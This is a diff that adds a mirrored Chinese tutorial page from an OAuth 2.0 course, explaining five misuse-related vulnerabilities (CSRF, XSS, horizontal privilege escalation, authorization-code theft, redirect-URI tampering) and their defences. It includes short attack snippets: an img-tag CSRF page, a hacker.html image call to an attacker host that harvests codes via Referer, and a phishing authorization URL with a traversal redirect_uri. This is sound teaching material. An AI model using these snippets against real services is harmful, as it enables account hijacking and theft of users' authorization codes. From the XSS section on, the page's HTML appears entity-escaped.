@@ -1,0 +1,190 @@
+<!doctype html>
+<html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>08 实践OAuth 2.0时，使用不当可能会导致哪些安全漏洞？ · 技术阅读库</title><link rel="stylesheet" href="/static/site.css"><link rel="stylesheet" href="/static/reading-history.css"><script src="/static/reader.js" defer></script><script src="/static/reading-history.js" defer></script></head><body class="reading-page"><a class="skip-link" href="#main-content">跳到正文</a><header class="topbar"><a class="brand" href="/" aria-label="技术阅读库首页"><span class="brand-icon" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M12 6c-3-2-6-2-9-1v14c3-1 6-1 9 1 3-2 6-2 9-1V5c-3-1-6-1-9 1Zm0 0v14"/></svg></span><span>技术阅读库<small>专栏 · 文章 · 书籍</small></span></a><details class="library-switcher"><summary>书库导航<svg viewBox="0 0 16 16" aria-hidden="true"><path d="m4 6 4 4 4-4"/></svg></summary><nav class="switcher-panel" aria-label="书库导航"><a class="switcher-link selected" data-section="courses" href="/"><span aria-hidden="true">▦</span>技术专栏</a><a class="switcher-link" data-section="articles" href="/articles/index.html"><span aria-hidden="true">≡</span>技术文章</a><a class="switcher-link" data-section="life" href="/relationships/index.html"><span aria-hidden="true">♡</span>生活文章</a><a class="switcher-link" data-section="pdf" href="/downloads/index.html"><span aria-hidden="true">▤</span>PDF 书籍</a><a class="switcher-about" href="/about.html">关于书库</a></nav></details></header><div class="workspace reading-layout"><aside class="sidebar reading-sidebar toc-sidebar"><a class="library-back return-to-library" href="/">← 返回书库</a><div class="chapter-heading"><span>正在阅读</span><a class="course-overview" href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/index.html">OAuth2.0实战课</a></div><details class="chapter-directory" open><summary>专栏目录<span class="chapter-count">16 篇</span><span class="chapter-toggle" aria-hidden="true">⌄</span></summary><div class="chapter-tools" hidden><label class="sr-only" for="chapter-search">筛选章节</label><input id="chapter-search" type="search" placeholder="筛选章节…" autocomplete="off"><button id="locate-current" type="button" hidden>定位当前</button></div><p class="chapter-empty" role="status" hidden>没有匹配的章节</p><div class="chapter-links"><!-- chapter-navigation:start --><strong>OAuth2.0实战课</strong><ul><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/00%20%E5%BC%80%E7%AF%87%E8%AF%8D%20%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%AD%A6OAuth%202.0%EF%BC%9F.html">00 开篇词 为什么要学OAuth 2.0？</a></li><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/01%20OAuth%202.0%E6%98%AF%E8%A6%81%E9%80%9A%E8%BF%87%E4%BB%80%E4%B9%88%E6%96%B9%E5%BC%8F%E8%A7%A3%E5%86%B3%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%EF%BC%9F.html">01 OAuth 2.0是要通过什么方式解决什么问题？</a></li><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/02%20%E6%8E%88%E6%9D%83%E7%A0%81%E8%AE%B8%E5%8F%AF%E7%B1%BB%E5%9E%8B%E4%B8%AD%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%80%E5%AE%9A%E8%A6%81%E6%9C%89%E6%8E%88%E6%9D%83%E7%A0%81%EF%BC%9F.html">02 授权码许可类型中，为什么一定要有授权码？</a></li><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/03%20%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1%EF%BC%9A%E6%8E%88%E6%9D%83%E7%A0%81%E5%92%8C%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%E7%9A%84%E9%A2%81%E5%8F%91%E6%B5%81%E7%A8%8B%E6%98%AF%E6%80%8E%E6%A0%B7%E7%9A%84%EF%BC%9F.html">03 授权服务：授权码和访问令牌的颁发流程是怎样的？</a></li><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/04%20%E5%9C%A8OAuth%202.0%E4%B8%AD%EF%BC%8C%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8JWT%E7%BB%93%E6%9E%84%E5%8C%96%E4%BB%A4%E7%89%8C%EF%BC%9F.html">04 在OAuth 2.0中，如何使用JWT结构化令牌？</a></li><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/05%20%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E3%80%81%E5%BF%AB%E9%80%9F%E5%9C%B0%E6%8E%A5%E5%85%A5OAuth%202.0%EF%BC%9F.html">05 如何安全、快速地接入OAuth 2.0？</a></li><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/06%20%E9%99%A4%E4%BA%86%E6%8E%88%E6%9D%83%E7%A0%81%E8%AE%B8%E5%8F%AF%E7%B1%BB%E5%9E%8B%EF%BC%8COAuth%202.0%E8%BF%98%E6%94%AF%E6%8C%81%E4%BB%80%E4%B9%88%E6%8E%88%E6%9D%83%E6%B5%81%E7%A8%8B%EF%BC%9F.html">06 除了授权码许可类型，OAuth 2.0还支持什么授权流程？</a></li><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/07%20%E5%A6%82%E4%BD%95%E5%9C%A8%E7%A7%BB%E5%8A%A8App%E4%B8%AD%E4%BD%BF%E7%94%A8OAuth%202.0%EF%BC%9F.html">07 如何在移动App中使用OAuth 2.0？</a></li><li><a class="active" aria-current="page" href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/08%20%E5%AE%9E%E8%B7%B5OAuth%202.0%E6%97%B6%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%AF%BC%E8%87%B4%E5%93%AA%E4%BA%9B%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%EF%BC%9F.html">08 实践OAuth 2.0时，使用不当可能会导致哪些安全漏洞？</a></li><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/09%20%E5%AE%9E%E6%88%98%EF%BC%9A%E5%88%A9%E7%94%A8OAuth%202.0%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AAOpenID%20Connect%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE..html">09 实战：利用OAuth 2.0实现一个OpenID Connect用户身份认证协议.</a></li><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/10%20%E4%B8%B2%E8%AE%B2%EF%BC%9AOAuth%202.0%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.html">10 串讲：OAuth 2.0的工作流程与安全问题</a></li><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/11%20%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B%EF%BC%9A%E4%BD%BF%E7%94%A8Spring%20Security%E6%90%AD%E5%BB%BA%E4%B8%80%E5%A5%97%E5%9F%BA%E4%BA%8EJWT%E7%9A%84OAuth%202.0%E6%9E%B6%E6%9E%84.html">11 实战案例：使用Spring Security搭建一套基于JWT的OAuth 2.0架构</a></li><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/12%20%E6%9E%B6%E6%9E%84%E6%A1%88%E4%BE%8B%EF%BC%9A%E5%9F%BA%E4%BA%8EOAuth%202.0_JWT%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E5%8F%82%E8%80%83%E6%9E%B6%E6%9E%84.html">12 架构案例：基于OAuth 2.0_JWT的微服务参考架构</a></li><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/13%20%E5%90%84%E5%A4%A7%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0%E6%98%AF%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8OAuth%202.0%E7%9A%84%EF%BC%9F.html">13 各大开放平台是如何使用OAuth 2.0的？</a></li><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/14%20%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA%EF%BC%9AOAuth%202.0%20%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E7%AD%94%E7%96%91.html">14 查漏补缺：OAuth 2.0 常见问题答疑</a></li><li><a href="/courses/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/%E7%BB%93%E6%9D%9F%E8%AF%AD%20%E6%8A%8A%E5%AD%A6%E4%B9%A0%E5%BD%93%E6%88%90%E4%B8%80%E7%A7%8D%E4%B9%A0%E6%83%AF.html">结束语 把学习当成一种习惯</a></li></ul><!-- chapter-navigation:end --></div></details></aside><main class="reading-main" id="main-content"><p class="origin">原始页面：<a href="https://learn.lianglianglee.com/%E4%B8%93%E6%A0%8F/OAuth2.0%E5%AE%9E%E6%88%98%E8%AF%BE/08%20%E5%AE%9E%E8%B7%B5OAuth%202.0%E6%97%B6%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%AF%BC%E8%87%B4%E5%93%AA%E4%BA%9B%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%EF%BC%9F.md" rel="noreferrer">源站链接</a></p><div class="book-post">
+<p align="center" id="tip"></p>
+<h1 class="title" data-id="08 实践OAuth 2.0时，使用不当可能会导致哪些安全漏洞？" id="title">08 实践OAuth 2.0时，使用不当可能会导致哪些安全漏洞？</h1>
+<div><p>　　你好，我是王新栋。</p>
+<p>　　当知道这一讲的主题是 OAuth 2.0 的安全漏洞时，你可能要问了：“OAuth 2.0 不是一种安全协议吗，不是保护 Web API 的吗？为啥 OAuth 2.0 自己还有安全的问题了呢？”</p>
+<p>　　首先，OAuth 2.0 的确是一种安全协议。这没啥问题，但是它有很多使用规范，比如授权码是一个临时凭据只能被使用一次，要对重定向 URI 做校验等。那么，如果使用的时候你没有按照这样的规范来实施，就会有安全漏洞了。</p>
+<p>　　其次，OAuth 2.0 既然是“生长”在互联网这个大环境中，就一样会面对互联网上常见安全风险的攻击，比如跨站请求伪造（Cross-site request forgery，CSRF）、跨站脚本攻击（Cross Site Scripting，XSS）。</p>
+<p>　　最后，除了这些常见攻击类型外，OAuth 2.0 自身也有可被利用的安全漏洞，比如授权码失窃、重定向 URI 伪造。</p>
+<p>　　所以，我们<strong>在实践 OAuth 2.0 的过程中，安全问题一定是重中之重</strong>。接下来，我挑选了 5 个典型的安全问题，其中 CSRF、XSS、水平越权这三种是互联网环境下常见的安全风险，授权码失窃和重定向 URI 被篡改属于 OAuth2.0“专属”的安全风险。接下来，我就和你一起看看这些安全风险的由来，以及如何应对吧。</p>
+<h2 id="csrf-攻击">CSRF 攻击</h2>
+<p>　　对于 CSRF 的定义，《OAuth 2 in Action》这本书里的解释，是我目前看到的最为贴切的解释：恶意软件让浏览器向<strong>已完成用户身份认证</strong>的网站发起请求，并<strong>执行有害的操作</strong>，就是跨站请求伪造攻击。</p>
+<p>　　它是互联网上最为常见的攻击之一。我们在实践 OAuth2.0 的过程，其实就是在构建一次互联网的应用。因此，OAuth 2.0 同样也会面临这个攻击。接下来，我通过一个案例和你说明这个攻击类型。</p>
+<p>　　有一个软件 A，我们让它来扮演攻击者，让它的开发者按照正常的流程使用极客时间。当该攻击者授权后，拿到授权码的值 codeA 之后，“立即按下了暂停键”，不继续往下走了。那它想干啥呢，我们继续往下看。</p>
+<p>　　这时，<strong>有一个第三方软件 B，比如咱们的 Web 版极客时间，来扮演受害者吧。</strong>当然最终的受害者是用户，这里是用 Web 版极客时间来作为被软件 A 攻击的对象。</p>
+<p>　　极客时间用于接收授权码的回调地址为 <code>https://time.geekbang.org/callback</code>。有一个用户 G 已经在极客时间的平台登录，且对极客时间进行了授权，也就是用户 G 已经在极客时间平台上有登录态了。</p>
+<p>　　如果此时攻击者软件 A，在自己的网站上构造了一个恶意页面：</p>
+<pre><code class="language-java">&lt;html&gt;
+	&lt;img src ="https://time.geekbang.org/callback？code=codeA"&gt;
+&lt;/html&gt;
+</code></pre>
+<p>　　如果这个时候用户 G 被攻击者软件 A 诱导而点击了这个恶意页面，那结果就是，极客时间使用 codeA 值去继续 OAuth 2.0 的流程了。这其实就走完了一个 CSRF 攻击的过程，如下图所示：</p>
+<p>　　<img alt="" src="/assets/f41d790dd83381d0deb8c2e9.webp"/></p>
+<p>　　图1 CSRF攻击过程</p>
+<p>　　如果我们将 OAuth 2.0 用于了身份认证，那么就会造成严重的后果，因为用户 G 使用的极客时间的<strong>授权上下文环境</strong>跟攻击者软件 A 的<strong>授权上下文环境</strong>绑定在了一起。为了解释两个上下文环境绑定在一起可能带来的危害，我们还是拿极客时间来举例。</p>
+<p>　　假如，极客时间提供了用户账号和微信账号做绑定的功能，也就是说用户先用自己的极客时间的账号登录，然后可以绑定微信账号，以便后续可以使用微信账号来登录。在绑定微信账号的时候，微信会咨询你是否给极客时间授权，让它获取你在微信上的个人信息。这时候，就需要用到 OAuth 2.0 的授权流程。</p>
+<p>　　如果攻击者软件 A，通过自己的极客时间账号事先做了上面的绑定操作，也就是说攻击者已经可以使用自己的微信账号来登录极客时间了。那有一天，软件 A 想要“搞事情”了，便在发起了一个授权请求后构造了一个攻击页面，里面包含的模拟代码正如我在上面描述的那样，来诱导用户 G 点击。</p>
+<p>　　而用户 G 已经用极客时间的账号登录了极客时间，此时正要去做跟微信账号的绑定。如果这个时候他刚好点击了攻击者 A“种下”的这个恶意页面，那么后面换取授权的访问令牌 access_token，以及通过 accces_token 获取的信息就都是攻击者软件 A 的了。</p>
+<p>　　这就相当于，用户 G 将自己的极客时间的账号跟攻击者软件 A 的微信账号绑定在了一起。这样一来，后续攻击者软件 A 就能够通过自己的微信账号，来登录用户 G 的极客时间了。这个后果可想而知。</p>
+<p>　　那如何避免这种攻击呢？方法也很简单，实际上 OAuth 2.0 中也有这样的建议，就是<strong>使用 state 参数</strong>，它是一个随机值的参数。</p>
+<p>　　还是以上面的场景为例，当极客时间请求授权码的时候附带一个自己生成 state 参数值，同时授权服务也要按照规则将这个随机的 state 值跟授权码 code 一起返回给极客时间。这样，当极客时间接收到授权码的时候，就要在极客时间这一侧做一个 state 参数值的比对校验，如果相同就继续流程，否则直接拒绝后续流程。</p>
+<p>　　在这样的情况下，软件 A 要想再发起 CSRF 攻击，就必须另外构造一个 state 值，而这个 state 没那么容易被伪造。这本就是一个随机的数值，而且在生成时就遵从了被“猜中”的概率要极小的建议。比如，生成一个 6 位字母和数字的组合值，显然要比生成一个 6 位纯数字值被“猜中”的概率要小。所以，软件 B 通过使用 state 参数，就实现了一个基本的防跨站请求伪造保护。</p>
+<p>　　我们再来总结下，这个攻击过程本质上就是，软件 A（攻击者）用自己的授权码 codeA 的值，通过 CSRF 攻击，“替换”了软件 B 的授权码的值。</p>
+<p>　　接下来，我再给你看一种互联网常见的安全攻击类型，也就是 XSS 攻击。</p>
+<h2 id="xss-攻击">XSS 攻击</h2>
+<p>　　XSS 攻击的主要手段是将恶意脚本注入到请求的输入中，攻击者可以通过注入的恶意脚本来进行攻击行为，比如搜集数据等。截止到 2020 年 6 月 23 日，在 OWASP（一个开源的 Web 应用安全项目）上查看安全漏洞排名的话，它依然在<a href="https://owasp.org/www-project-top-ten/" target="_blank">TOP10</a>榜单上面，可谓“大名鼎鼎”。</p>
+<p>　　网络上有很多关于 XSS 的介绍了，我推荐你看看<a href="https://segmentfault.com/a/1190000013315450" target="_blank">《XSS 攻击原理分析与防御技术》</a>这篇文章，它很清晰地分析了 XSS 的原理以及防御方法。今天，我们主要看看它是怎么在 OAuth 2.0 的流程中“发挥”的。</p>
+<p>　　当请求抵达受保护资源服务时，系统需要做校验，比如第三方软件身份合法性校验、访问令牌 access_token 的校验，如果这些信息都不能被校验通过，受保护资源服务就会返回错误的信息。</p>
+<p>　　<img alt="" src="/assets/36f2b8e1b5bec1e87e61ebc2.webp"/></p>
+<p>　　图2 XSS攻击过程</p>
+<p>　　大多数情况下，受保护资源都是把输入的内容，比如 app_id invalid、access_token invalid ，再回显一遍，这时就会被 XSS 攻击者捕获到机会。试想下，如果攻击者传入了一些恶意的、搜集用户数据的 JavaScript 代码，受保护资源服务直接原路返回到用户的页面上，那么当用户触发到这些代码的时候就会遭受到攻击。</p>
+<p>　　因此，受保护资源服务就需要对这类 XSS 漏洞做修复，而具体的修复方法跟其它网站防御 XSS 类似，最简单的方法就是<strong>对此类非法信息做转义过滤</strong>，比如对包含&lt;script&gt;、&lt;img&gt;、&lt;a&gt;等标签的信息进行转义过滤。&lt;/p&gt;
+
+&lt;p&gt;　　CSRF 攻击、XSS 攻击是我从 OWASP 网站上挑选的两个最为熟知的两种攻击类型，它们应该是所有 Web 系统都需要共同防范的。我们在实施 OAuth 2.0 架构的时候，也一定要考虑到这层防护，否则就会给用户造成伤害。接下来，我再带着你了解一下水平越权攻击。&lt;/p&gt;
+
+&lt;h2 id="水平越权"&gt;水平越权&lt;/h2&gt;
+
+&lt;p&gt;　　&lt;strong&gt;水平越权是指，在请求受保护资源服务数据的时候，服务端应用程序未校验这条数据是否归属于当前授权的请求用户&lt;/strong&gt;。这样不法者用自己获得的授权来访问受保护资源服务的时候，就有可能获取其他用户的数据，导致水平越权漏洞问题的发生。攻击者可越权的操作有增加、删除、修改和查询，无论更新操作还是查询操作都有相当的危害性。&lt;/p&gt;
+
+&lt;p&gt;　　这么说可能有些抽象，我们看一个具体的例子。&lt;/p&gt;
+
+&lt;p&gt;　　还是以我们的“小兔打单软件”为例，第三方开发者开发了这款打单软件，目前有两个商家 A 和商家 B 购买并使用。现在小兔打单软件上面提供了根据订单 ID 查询订单数据的功能，如下图所示。&lt;/p&gt;
+
+&lt;p&gt;　　&lt;img src="assets/42c7534227ffcd72f05db518e6b76577-20220724223156-z55fw05.png" alt="" /&gt;&lt;/p&gt;
+
+&lt;p&gt;　　图3 水平越权发生场景&lt;/p&gt;
+
+&lt;p&gt;　　商家 A 和商家 B 分别给小兔打单软件应用做了授权，也就是说，小兔打单软件可以获取商家 A 和商家 B 的订单数据。此时没有任何问题，&lt;strong&gt;那么商家 A 可以获取商家 B 的订单数据吗？&lt;/strong&gt;答案是，极有可能的。&lt;/p&gt;
+
+&lt;p&gt;　　在开放平台环境下，授权关系的校验是由一般由开放网关这一层来处理，因为受保护资源服务会散落在各个业务支持部门。请求数据通过开放网关之后由访问令牌 access_token 获取了用户的身份，比如商家 ID，就会透传到受保护资源服务，也就是上游接口提供方的系统。&lt;/p&gt;
+
+&lt;p&gt;　　此时，如果受保护资源服务没有对商家 ID 和订单 ID 做归属判断，就有可能发生商家 A 获取商家 B 订单数据的问题，造成水平越权问题。&lt;/p&gt;
+
+&lt;p&gt;　　&lt;img src="assets/0eaa1a1c991ee25406a85e9dfa17b64f-20220724223155-50584ew.png" alt="" /&gt;&lt;/p&gt;
+
+&lt;p&gt;　　图4 水平越权示例图&lt;/p&gt;
+
+&lt;p&gt;　　发生水平越权问题的根本原因，还是开发人员的认知与意识不够。如果认知与意识跟得上，那在设计之初增加归属关系判断，比如上面提到的订单 ID 和商家 ID 的归属关系判断，就能在很大程度上避免这个漏洞。&lt;/p&gt;
+
+&lt;p&gt;　　同时，在开放平台环境下，由于开放网关和数据接口提供方来自不同的业务部门，防止水平校验的逻辑处理很容易被遗漏：&lt;/p&gt;
+
+&lt;p&gt;　　一方面，开放网关的作用是将用户授权之后的访问令牌 access_token 信息转换成真实的用户信息，比如上面提到的商家 ID，然后传递到接口提供方，数据归属判断逻辑只能在接口提供方内部处理；&lt;/p&gt;
+
+&lt;p&gt;　　另一方面，数据提供方往往会认为开放出的接口是被“跟自己一个公司的系统所调用的”，容易忽略水平校验的逻辑处理。&lt;/p&gt;
+
+&lt;p&gt;　　所以，在开放平台环境下，我们就要更加重视与防范数据的越权问题。&lt;/p&gt;
+
+&lt;p&gt;　　以上，CSRF 攻击、XSS 攻击、水平越权这三种攻击类型，它们都属于 OAuth 2.0 面临的互联网非常常见的通用攻击类型。而对于其他的互联网攻击类型，如果你想深入了解的话，可以看一下这篇&lt;a href="https://wooyun.js.org/drops/OAuth%202.0%E5%AE%89%E5%85%A8%E6%A1%88%E4%BE%8B%E5%9B%9E%E9%A1%BE.html" target="_blank"&gt;安全案例回顾&lt;/a&gt;的文章。&lt;/p&gt;
+
+&lt;p&gt;　　接下来，我们再看两种 OAuth 2.0 专有的安全攻击，分别是授权码失窃、重定向 URI 被篡改。&lt;/p&gt;
+
+&lt;h2 id="授权码失窃"&gt;授权码失窃&lt;/h2&gt;
+
+&lt;p&gt;　　我们举个例子，先来学习授权码失窃这个场景。&lt;/p&gt;
+
+&lt;p&gt;　　如果第三方软件 A 有合法的 app_id 和 app_secret，那么当它去请求访问令牌的时候，也是合法的。这个时候没有任何问题，让我们继续。&lt;/p&gt;
+
+&lt;p&gt;　　如果有一个用户 G 对第三方软件 B，比如极客时间，进行授权并产生了一个授权码 codeB，但并没有对攻击者软件 A 授权。此时，软件 A 是不能访问用户 G 的所有数据的。但这时，如果软件 A 获取了这个 codeB，是不是就能够在没有获得用户 G 授权的情况下访问用户 G 的数据了？整个过程如下图所示。&lt;/p&gt;
+
+&lt;p&gt;　　&lt;img src="assets/7d464d5a0c49a77862fef10f77cf057b-20220724223155-e1p988k.png" alt="" /&gt;&lt;/p&gt;
+
+&lt;p&gt;　　图5 授权码失窃攻击过程&lt;/p&gt;
+
+&lt;p&gt;　　&lt;strong&gt;这时问题的根源就在于两点：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;　　授权服务在进行授权码校验的时候，没有校验 app_id_B；&lt;/p&gt;
+
+&lt;p&gt;　　软件 B（也就是极客时间）使用过一次 codeB 的值之后，授权服务没有删除这个 codeB；&lt;/p&gt;
+
+&lt;p&gt;　　看到这里，通过校验 app_id_B，并删除掉使用过一次的授权码及其对应的访问令牌，就可以从根本上来杜绝授权码失窃带来的危害了。&lt;/p&gt;
+
+&lt;p&gt;　　说到这里，你不禁要问了，授权码到底是怎么失窃的呢？接下来，我要介绍的就是授权码失窃的可能的方法之一，这也是 OAuth 2.0 中因重定向 URI 校验方法不当而遭受到的一种危害。这种安全攻击类型，就是重定向 URI 被篡改。&lt;/p&gt;
+
+&lt;h2 id="重定向-uri-被篡改"&gt;重定向 URI 被篡改&lt;/h2&gt;
+
+&lt;p&gt;　　有的时候，授权服务提供方并没有对第三方软件的回调 URI 做完整性要求和完整性校验。比如，第三软件 B 极客时间的详细回调 URI 是&lt;code&gt;https://time.geekbang.org/callback&lt;/code&gt;，那么在完整性校验缺失的情况下，只要以&lt;code&gt;https://time.geekbang.org&lt;/code&gt;开始的回调 URI 地址，都会被认为是合法的。&lt;/p&gt;
+
+&lt;p&gt;　　此时，如果黑客在&lt;code&gt;https://time.geekbang.org/page/&lt;/code&gt;下，创建了一个页面 &lt;strong&gt;hacker.html&lt;/strong&gt;。这个页面的内容可以很简单，其目的就是让请求能够抵达攻击者的服务。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="language-java"&gt;&amp;lt;html&amp;gt;
+	&amp;lt;img src =&amp;quot;https://clientA.com/catch&amp;quot;&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;　　好了，我们继续看下接下来的攻击流程：&lt;/p&gt;
+
+&lt;p&gt;　　&lt;img src="assets/04d71e6a8d32fe8b516db7e7424bf141-20220724223155-3jgo5gq.png" alt="" /&gt;&lt;/p&gt;
+
+&lt;p&gt;　　图6 重定向URI被篡改的攻击过程&lt;/p&gt;
+
+&lt;p&gt;　　首先，黑客将构造的攻击页面放到对应的 hacker.html 上，也就是&lt;code&gt;https://time.geekbang.org/page/hacker.html&lt;/code&gt;上 ，同时构造出了一个新的重定向 URI，即&lt;code&gt;https://time.geekbang.org/page/welcome/back.html../hacker.html&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;　　然后，黑客利用一些钓鱼手段诱导用户，去点击下面的这个地址：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="language-shell"&gt;https://oauth-server.com/auth?respons_type=code&amp;amp;client_id=CLIENTID&amp;amp;redirect_uri=https://time.geekbang.org/page/welcome/back.html../hacker.html
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;　　这样当授权服务做出响应进行重定向请求的时候，授权码 code 就返回到了 hacker.html 这个页面上。&lt;/p&gt;
+
+&lt;p&gt;　　最后，黑客在&lt;code&gt;https://clientA.com/catch&lt;/code&gt;页面上，解析 Referrer 头部就会得到用户的授权码，继而就可以像授权码失窃的场景中那样去换取访问令牌了。&lt;/p&gt;
+
+&lt;p&gt;　　看到这里我们就知道了，如果授权服务要求的回调 URI 是&lt;code&gt;https://time.geekbang.org/callback&lt;/code&gt;，并做了回调 URI 的完整性校验，那么被篡改之后的回调地址&lt;code&gt;https://time.geekbang.org/page/welcome/back.html../hacker.html&lt;/code&gt;就不会被授权服务去发起重定向请求。&lt;/p&gt;
+
+&lt;p&gt;　　严格来讲，要发生这样的漏洞问题，条件还是比较苛刻的。从图 6 的重定向 URI 被篡改的流程中，也可以看到，只要我们在授权服务验证第三方软件的请求时做了签名校验，那么攻击者在只拿到授权码 code 的情况下，仍然无法获取访问令牌，因为第三方软件只有通过访问令牌才能够访问用户的数据。&lt;/p&gt;
+
+&lt;p&gt;　　但是，如果这些防范安全风险的规范建议你通通都没有遵守，那就是在给攻击者“大显身手”的机会，让你的应用软件以及用户遭受损失。&lt;/p&gt;
+
+&lt;h2 id="总结"&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;　　好了，以上就是今天的主要内容了。我们一起学习了 OAuth 2.0 相关的常见又比较隐蔽的 5 种安全问题，包括 CSRF 攻击、XSS 攻击、水平越权、授权码失窃、重定向 URI 被篡改。更多关于 OAuth 2.0 安全方面的内容，你也可以去翻阅《OAuth 2 in Action》这本书。&lt;/p&gt;
+
+&lt;p&gt;　　通过这一讲的学习，你需要记住以下三个知识点：&lt;/p&gt;
+
+&lt;p&gt;　　互联网场景的安全攻击类型比如 CSRF、XSS 等，在 OAuth 2.0 中一样要做防范，因为 OAuth 2.0 本身就是应用在互联网场景中。&lt;/p&gt;
+
+&lt;p&gt;　　除了常见的互联网安全攻击，OAuth 2.0 也有自身的安全风险问题，比如我们讲到的授权码失窃、重定向 URI 被篡改。&lt;/p&gt;
+
+&lt;p&gt;　　这些安全问题，本身从攻击的“技术含量”上并不高，但导致这些安全风险的因素，往往就是开发人员的安全意识不够。比如，没有意识到水平越权中的数据归属逻辑判断，需要加入到代码逻辑中。&lt;/p&gt;
+
+&lt;p&gt;　　其实，OAuth 2.0 的规范里面对这些安全问题都有对应的规避方式，但都要求我们使用的时候一定要非常严谨。比如，重定向 URI 的校验方式，规范里面是允许模糊校验的，但在结合实际环境的时候，我们又必须做到精确匹配校验才可以保障 OAuth 2.0 流转的安全性。&lt;/p&gt;
+
+&lt;p&gt;　　最后，我还整理了一张知识脑图，总结了这 5 种攻击方式的内容，来帮助你理解与记忆。&lt;/p&gt;
+
+&lt;p&gt;　　&lt;img src="assets/479c2f3945d7a8e186f91f58b89db57f-20220724223155-s1f1ysg.jpg" alt="" /&gt;&lt;/p&gt;
+
+&lt;h2 id="思考题"&gt;思考题&lt;/h2&gt;
+
+&lt;p&gt;　　今天我们讲的这些安全问题，都是站在“守”的一方，并没有告诉你如何 “绞尽脑汁” 地利用漏洞。所谓“知己知彼，百战不殆”，现在你站在“攻”的一方来考虑下，除了重定向 URI 被篡改，还有什么其它的授权码被盗的场景吗？&lt;/p&gt;
+
+&lt;p&gt;　　你认为还有哪些安全风险，是专属于 OAuth 2.0 的吗？&lt;/p&gt;
+
+&lt;p&gt;　　欢迎你在留言区分享你的观点，也欢迎你把今天的内容分享给其他朋友，我们一起交流。&lt;/p&gt;
+&lt;/div&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;div id="prePage" style="float: left"&gt;
+
+                            &lt;/div&gt;
+                            &lt;div id="nextPage" style="float: right"&gt;
+
+                            &lt;/div&gt;
+                        &lt;/div&gt;
+
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class="copyright"&gt;
+                &lt;hr /&gt;
+                &lt;p&gt;© 2019 - 2023 &lt;a href="mailto:lll941107@gmail.com" target="_blank"&gt;Liangliang Lee&lt;/a&gt;.
+                    Powered by &lt;a href="https://github.com/gin-gonic/gin" target="_blank"&gt;gin&lt;/a&gt; and &lt;a
+                        href="https://github.com/kaiiiz/hexo-theme-book" target="_blank"&gt;hexo-theme-book&lt;/a&gt;.&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;a class="off-canvas-overlay" onclick="hide_canvas()"&gt;&lt;/a&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;script async src="https://www.googletagmanager.com/gtag/js?id=G-NPSEEVD756"&gt;&lt;/script&gt;
+&lt;script src="/static/index.js"&gt;&lt;/script&gt;
